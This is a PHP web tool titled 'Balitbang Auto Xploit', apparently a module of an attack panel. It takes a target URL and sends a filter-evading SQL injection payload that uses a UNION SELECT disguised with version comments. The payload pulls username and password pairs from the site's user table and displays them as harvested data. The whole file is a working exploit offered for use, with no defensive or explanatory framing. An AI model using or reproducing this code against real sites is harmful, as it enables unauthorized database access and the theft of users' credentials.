<?php
$judul=@Balitbang_Auto_Xploit;
include'sec.php';
error_reporting(0);
?>
<div class="container">
  <div class="row">
  <div class="col">
  <div class="card">
    <div class="card-header"><p><?php echo str_replace("_", " ", "$judul"); ?></p></div>
    <div class="card-body">
      <div class="table-responsive">
          <center>
					<div class="col-md-6">
						<form method="post">
					<input type="url" class="form-control mb-3" required="required" autocomplete="off" placeholder="Target" name="url">
					</div>
					<div class="col-md-6">
						<button class="btn btn-info btn-block" name="start">Start</button>
					</div>
					</center>
	
          <?php
$url = isset($_POST['url']) ? htmlspecialchars(addslashes($_POST['url'])) : '';
if(!empty($url)){
   	$ch    = curl_init();
   	$query = "(select+group_concat('<result>',username,0x3a,password,'</result>')+from+user)";
// Set option curl
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "queryString=exploit'/**//*!12345uNIoN*//**//*!12345sELEcT*//**/$query,version()-- -");
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_VERBOSE, false);
		$exec = curl_exec($ch);
		$preg = preg_match_all("'<result>(.*?)</result>'si", $exec, $isi);
   }
?>		
<?php
if(isset($_POST["start"])){
	if(!empty($isi[1])){
		echo '<div class="tile">
            <h5 class="text-center">Berhasil mendapatkan data</h5><hr>';
             	$i = 1;
             	foreach($isi[1] as $key){
             		$result = "<li><i class='fa fa-user-circle'></i> Username : ".str_replace(":", "</li><li><i class='fa fa-key'></i> Password : ", $key)."</li>";
             		if($i != 1) echo "<hr>";
             		echo "<i class='fa fa-pie-chart'></i> Data ".$i++;
             		echo "<br>$result";
             	}
            //echo '</ul>';
	}else{
		echo '<center><p class="text-danger">Baka</p></center>';
	}
}
?>
	